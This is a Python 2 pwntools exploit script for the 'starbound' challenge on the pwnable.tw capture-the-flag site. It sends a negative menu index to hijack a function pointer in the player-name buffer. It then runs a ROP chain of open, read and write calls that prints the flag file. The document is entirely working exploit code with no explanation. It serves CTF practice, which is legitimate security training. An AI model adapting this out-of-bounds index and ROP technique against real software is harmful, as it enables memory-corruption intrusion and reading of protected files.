#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = remote('chall.pwnable.tw', 10202)
else:
    conn = process(['/home/doublesine/Desktop/starbound'])

open_addr = 0x08048970
read_addr = 0x08048A70
write_addr = 0x08048A30

playername_addr = 0x080580D0
target_path = '/home/starbound/flag\x00'

def Sendline(s):
    conn.sendline(s)
    print(s)
    sleep(0.5)

def SetROPStartAddr():
    print conn.read(),
    Sendline('6')
    print conn.read(),
    Sendline('2')
    print conn.read(),
    Sendline(pack(0x08048e48, 32) + target_path)
    print conn.read(),

SetROPStartAddr()
# 0x08048936 : add esp, 8 ; pop ebx ; ret
Sendline('-33\x00' + 'fuck' + 
         pack(open_addr, 32) + pack(0x08048936, 32) + pack(playername_addr + 4, 32) + pack(0, 32) + pack(0, 32) + 
         pack(read_addr, 32) + pack(0x08048936, 32) + pack(3, 32) + pack(playername_addr + 4 + len(target_path), 32) + pack(128 - 4 - len(target_path), 32) +
         pack(write_addr, 32) + pack(0x0804A664, 32) + pack(1, 32) + pack(playername_addr + 4 + len(target_path), 32) + pack(128 - 4 - len(target_path), 32))
print conn.read(),
conn.close()
